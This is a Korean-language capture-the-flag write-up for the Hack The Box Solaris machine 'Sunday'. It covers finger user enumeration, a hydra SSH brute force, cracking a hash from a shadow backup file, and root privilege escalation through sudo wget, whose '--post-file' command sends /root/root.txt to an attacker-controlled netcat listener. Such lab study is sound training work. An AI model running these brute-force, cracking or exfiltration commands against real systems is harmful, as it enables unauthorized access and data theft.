# HTB - Sunday ☀️

> **OS:** Solaris (Oracle Solaris 11.4)  
> **Difficulty:** Easy  
> **Tags:** #HTB #OSCP #Finger #UserEnum #BruteForce #ShadowBackup #wget #Privesc

---

## 📋 Machine Info

|항목|내용|
|---|---|
|IP|10.129.187.128|
|OS|Oracle Solaris 11.4|
|난이도|Easy|
|핵심 기술|Finger User Enum, SSH Brute Force, Shadow Backup, wget sudo privesc|

---

## 🧭 1. Enumeration

### Nmap

```bash
# -sV -sC 사용 시 Solaris가 ping probe 차단해서 host down으로 판단됨
# 반드시 -Pn 추가!
nmap -p- --min-rate 5000 -T4 -Pn -sV -sC 10.129.187.128 -oN nmap/initial.txt
```

**결과:**

```
PORT      STATE SERVICE  VERSION
79/tcp    open  finger   Sun Solaris fingerd
111/tcp   open  rpcbind
515/tcp   open  printer
6787/tcp  open  smc-admin
22022/tcp open  ssh      OpenSSH (Solaris)
```

> ⚠️ **Solaris 주의:** `-Pn` 없으면 호스트가 down으로 잡힘!  
> ⚠️ SSH 포트가 **22가 아닌 22022**

---

## 👤 2. Finger User Enumeration (Port 79)

**finger** 서비스 = 시스템에 로그인된 유저 정보를 조회하는 오래된 프로토콜

### 현재 로그인 유저 확인

```bash
finger @10.129.187.128
# → No one logged on
```

### finger-user-enum으로 유저 브루트포스

```bash
# apt에 없으므로 직접 다운로드
wget https://raw.githubusercontent.com/pentestmonkey/finger-user-enum/master/finger-user-enum.pl
chmod +x finger-user-enum.pl

# 스캔 실행 (-w 로 worker 수 늘려서 속도 향상)
./finger-user-enum.pl -w 50 -U /usr/share/seclists/Usernames/Names/names.txt -t 10.129.187.128 | tee finger_results.txt
```

> 💡 **OSCP 팁:** names.txt(10713개)는 너무 느림. 작은 wordlist 먼저!
> 
> ```bash
> # 빠른 스캔용 작은 wordlist 먼저
> ./finger-user-enum.pl -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 10.129.187.128
> ```

### pts 유저 확인

finger 결과에서 **pts** (pseudo terminal) 컬럼이 있는 유저만 카운트:

```bash
grep "pts" finger_results.txt
```

→ 유효한 유저 발견: **`sunny`**, **`sammy`**

---

## 🔑 3. SSH Brute Force — sunny

SSH 포트가 **22022**임에 주의!

```bash
hydra -l sunny -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  ssh://10.129.187.128:22022 -t 4
```

> 💡 **OSCP 팁:** 큰 wordlist(rockyou.txt) 전에 작은 거 먼저!  
> SSH 브루트포스는 `-t 4` 이상 올리면 계정 잠길 수 있으니 주의

→ **sunny : sunday** 발견 ✅

---

## 🖥️ 4. Initial Foothold — SSH Login

```bash
ssh -p 22022 sunny@10.129.187.128
# Password: sunday
```

---

## 🔍 5. Privilege Escalation — sammy

### sudo -l 확인

```bash
sudo -l
# (root) NOPASSWD: /root/troll
```

`/root/troll` 실행해보면:

```bash
sudo /root/troll
# testing
# uid=0(root) gid=0(root)
# → 쉘은 안 줌. 이름처럼 troll 😂
```

### shadow.backup 발견

```bash
ls /
# backup 디렉토리 발견!

ls /backup
# agent22.backup  shadow.backup

cat /backup/shadow.backup
```

```
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

### sammy 해시 크랙

```bash
# 해시 저장
echo '$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB' > sammy.hash

# john으로 크랙 (hashcat보다 빠름)
john sammy.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=sha256crypt
```

> ⚠️ sha256crypt($5$)는 느림. VM 환경에서 수 시간 걸릴 수 있음

→ **sammy : cooldude!** ✅

### sammy로 SSH 접속

```bash
ssh -p 22022 sammy@10.129.187.128
# Password: cooldude!
```

### User Flag 획득

```bash
cat ~/user.txt
```

---

## 🔐 6. Privilege Escalation to Root — wget

### sammy sudo -l 확인

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/wget
```

### wget으로 root.txt 읽기

**Kali에서 (터미널 1) — nc 리스너:**

```bash
nc -lvnp 8080
```

**sammy SSH에서 (터미널 2):**

```bash
sudo wget --post-file=/root/root.txt http://KALI_IP:8080
```

→ nc 리스너에 root.txt 내용이 전송됨! 🏁

> 💡 **왜 `--post-file`?**  
> Solaris의 wget은 구버전이라 gtfobins의 `--use-askpass` 옵션이 없음  
> `--post-file`로 파일 내용을 HTTP POST로 전송하는 방식 사용

---

## 🗺️ Attack Path Summary

```
Nmap (-Pn 필수!) → Finger (port 79) → User Enum (sunny, sammy)
        ↓
SSH Brute Force (port 22022) → sunny : sunday
        ↓
/backup/shadow.backup → sammy 해시 크랙 → cooldude!
        ↓
sammy SSH → sudo wget → --post-file=/root/root.txt → ROOT 🏁
```

---

## 💡 Key Takeaways

|기술|설명|
|---|---|
|**Finger enum**|79포트, finger-user-enum.pl로 유저 브루트포스|
|**Solaris nmap**|`-Pn` 필수, SSH는 22022|
|**shadow.backup**|`/backup` 디렉토리 — 항상 백업 파일 찾기!|
|**wget privesc**|`--post-file`로 root 파일 외부로 전송|
|**sha256crypt**|john/hashcat 느림 → 작은 wordlist 먼저|

---

## 🔧 Tools Used

- `nmap`
- `finger-user-enum.pl`
- `hydra`
- `john`
- `ssh`
- `wget` (privesc)
- `netcat`